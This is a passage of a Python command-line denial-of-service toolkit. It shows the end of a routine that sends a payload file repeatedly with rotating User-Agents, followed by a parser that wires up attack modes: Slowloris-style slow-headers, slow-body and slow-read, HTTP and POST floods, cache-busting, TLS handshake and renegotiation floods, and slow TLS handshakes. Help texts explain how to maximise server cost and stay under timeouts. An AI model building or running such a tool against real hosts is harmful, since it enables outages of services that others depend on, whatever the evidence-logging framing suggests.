    results = []
    log.info("payload bytes=%d url=%s requests=%d", len(body), url, a.requests)

    for i in range(a.requests):
        start = time.monotonic()
        status, err = None, None
        try:
            req = urllib.request.Request(url, data=body, method=a.method,
                                         headers={"Content-Type": a.content_type,
                                                  "User-Agent": random.choice(USER_AGENTS)})
            ctx = _make_ctx(a.insecure) if a.tls else None
            resp = urllib.request.urlopen(req, timeout=a.timeout, context=ctx)
            try:
                _ = resp.read(256)
                status = resp.status
            finally:
                resp.close()
        except Exception as e:
            err = type(e).__name__ + ": " + str(e)[:120]
        latency = time.monotonic() - start
        results.append({"i": i, "status": status, "error": err,
                        "latency_s": round(latency, 3)})
        log.info("req=%d status=%s err=%s latency=%.2fs", i, status, err, latency)

    with open(str(jsonl), "w") as f:
        for r in results:
            f.write(json.dumps(r) + "\n")
    avg = sum(r["latency_s"] for r in results) / len(results)
    log.info("done. avg_latency=%.2fs evidence=%s", avg, jsonl)


# ----------------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------------


def build_parser():
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = p.add_subparsers(dest="cmd")
    sub.required = True  # 3.6: required= on add_subparsers not honoured; set here

    def common(sp, with_path=False):
        sp.add_argument("--host", required=True)
        sp.add_argument("--port", type=int, default=443)
        sp.add_argument("--tls", action="store_true")
        sp.add_argument("--insecure", action="store_true",
                        help="Skip TLS cert verification (non-prod / self-signed)")
        sp.add_argument("--duration", type=int, default=180)
        sp.add_argument("--probe-interval", type=int, default=5)
        sp.add_argument("--evidence-dir", default="./evidence")
        if with_path:
            sp.add_argument("--path", default="/")

    sp = sub.add_parser("slow-headers"); common(sp)
    sp.add_argument("--sockets", type=int, default=150)
    sp.add_argument("--keepalive-interval", type=int, default=15)
    sp.set_defaults(func=cmd_slow_headers)

    sp = sub.add_parser("slow-body"); common(sp, with_path=True)
    sp.add_argument("--sockets", type=int, default=150)
    sp.add_argument("--keepalive-interval", type=int, default=15)
    sp.add_argument("--content-length", type=int, default=8192)
    sp.set_defaults(func=cmd_slow_body)

    sp = sub.add_parser("slow-read"); common(sp, with_path=True)
    sp.add_argument("--sockets", type=int, default=150)
    sp.add_argument("--read-interval", type=int, default=10)
    sp.add_argument("--recv-buf", type=int, default=128)
    sp.set_defaults(func=cmd_slow_read)

    sp = sub.add_parser("http-flood"); common(sp, with_path=True)
    sp.add_argument("--rps", type=float, default=50)
    sp.add_argument("--workers", type=int, default=20)
    sp.set_defaults(func=cmd_http_flood)

    sp = sub.add_parser("cache-bust"); common(sp, with_path=True)
    sp.add_argument("--rps", type=float, default=50)
    sp.add_argument("--workers", type=int, default=20)
    sp.set_defaults(func=cmd_cache_bust)

    sp = sub.add_parser("post-flood"); common(sp, with_path=True)
    sp.add_argument("--rps", type=float, default=25)
    sp.add_argument("--workers", type=int, default=20)
    sp.add_argument("--body-file")
    sp.add_argument("--content-type", default="application/json")
    sp.set_defaults(func=cmd_post_flood)

    sp = sub.add_parser("tls-handshake-flood"); common(sp)
    sp.add_argument("--rps", type=float, default=50,
                    help="Target handshakes per second (start low, raise if needed)")
    sp.add_argument("--workers", type=int, default=20)
    sp.add_argument("--connect-timeout", type=float, default=10)
    sp.add_argument("--no-resumption", action="store_true",
                    help="Disable TLS session tickets (OP_NO_TICKET); forces full handshakes")
    sp.add_argument("--new-context-per-handshake", action="store_true",
                    help="Rebuild SSLContext per handshake; maximally expensive client-side too")
    sp.set_defaults(func=cmd_tls_handshake_flood)

    sp = sub.add_parser("tls-reneg-flood"); common(sp)
    sp.add_argument("--attempts", type=int, default=20,
                    help="How many client-initiated reneg requests to send")
    sp.add_argument("--interval", type=float, default=1,
                    help="Seconds between reneg requests")
    sp.set_defaults(func=cmd_tls_reneg_flood)

    sp = sub.add_parser("tls-slow-handshake"); common(sp)
    sp.add_argument("--sockets", type=int, default=150)
    sp.add_argument("--drip-bytes", type=int, default=1,
                    help="Bytes of ClientHello to send per drip cycle")
    sp.add_argument("--drip-interval", type=int, default=15,
                    help="Seconds between drip cycles (under server handshake timeout)")
    sp.add_argument("--connect-timeout", type=float, default=4)
    sp.set_defaults(func=cmd_tls_slow_handshake)

    sp = sub.add_parser("tls-recon"); common(sp)
    sp.set_defaults(func=cmd_tls_recon)

    sp = sub.add_parser("payload"); common(sp, with_path=True)
    sp.add_argument("--payload-file", required=True)
    sp.add_argument("--method", default="POST")
    sp.add_argument("--content-type", default="application/xml")
    sp.add_argument("--requests", type=int, default=10)
    sp.add_argument("--timeout", type=int, default=30)
    sp.set_defaults(func=cmd_payload)

    return p


if __name__ == "__main__":
    args = build_parser().parse_args()
    sys.exit(args.func(args) or 0)
